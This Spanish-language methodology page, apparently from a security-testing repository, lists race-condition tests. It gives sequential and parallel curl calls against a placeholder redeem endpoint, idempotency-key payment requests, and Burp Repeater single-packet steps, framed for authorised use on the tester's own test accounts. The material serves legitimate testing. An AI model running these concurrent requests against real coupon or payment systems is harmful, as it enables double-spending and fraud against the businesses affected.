# 🗡️ Race condition: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Control secuencial A → B

**Objetivo:** Establecer la regla con un cupón u objeto de prueba reversible.

```bash
for n in 1 2; do curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer {TOKEN_A}" "https://{ORIGEN}/api/test/{ID_PROPIO}/redeem"; done
```

**Interpretación:** Registrar el estado final; dos respuestas 200 pueden corresponder a un solo efecto.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/race-conditions).

### 2. Dos solicitudes paralelas

**Objetivo:** Comparar con el control secuencial y un objeto nuevo.

```bash
printf "%s\n" 1 2 | xargs -P2 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer {TOKEN_A}" "https://{ORIGEN}/api/test/{ID_PROPIO_2}/redeem"
```

**Interpretación:** Solo dos requests, si el programa lo permite; verificar doble efecto persistido.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/race-conditions).

### 3. Mismo Idempotency-Key

**Objetivo:** Verificar deduplicación del mismo intento de pago simulado.

```http
POST /api/test-payments HTTP/1.1
Host: {ORIGEN}
Idempotency-Key: {CLAVE_PROPIA}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"amount":1,"currency":"TEST"}
```

**Interpretación:** Repetir la misma solicitud en entorno de pruebas; debe producir una sola operación lógica.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/race-conditions).

### 4. Claves de idempotencia diferentes

**Objetivo:** Distinguir deduplicación de una regla que impide duplicados por negocio.

```text
Solicitud A: Idempotency-Key: {K1}
Solicitud B: Idempotency-Key: {K2}
Mismo objeto propio de prueba
```

**Interpretación:** Dos claves pueden autorizar dos operaciones legítimas; la invariante del negocio decide si hay fallo.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/race-conditions).

### 5. Dos endpoints sobre el mismo estado

**Objetivo:** Buscar ventana multietapa con recursos propios.

```text
En grupo paralelo de Burp Repeater:
POST /api/test/{ID_PROPIO}/confirm
POST /api/test/{ID_PROPIO}/cancel
```

**Interpretación:** El estado final debe satisfacer una transición válida. No usar pedidos o pagos reales.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/race-conditions).

### 6. Sincronización HTTP/2 en laboratorio

**Objetivo:** Reducir jitter de red al confirmar una carrera conocida.

```text
Burp Repeater → Send group in parallel (HTTP/2 single-packet) → 2 requests a {LAB_AISLADO}
```

**Interpretación:** Comparar con ejecución secuencial. La técnica es de laboratorio y depende del soporte HTTP/2.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition).

### 7. Lectura entre pasos

**Objetivo:** Observar estado parcial sin modificar terceros.

```http
GET /api/test/{ID_PROPIO}/status HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Consultar durante una transición propia y distinguir estado transitorio esperado de un permiso indebido.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/race-conditions).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
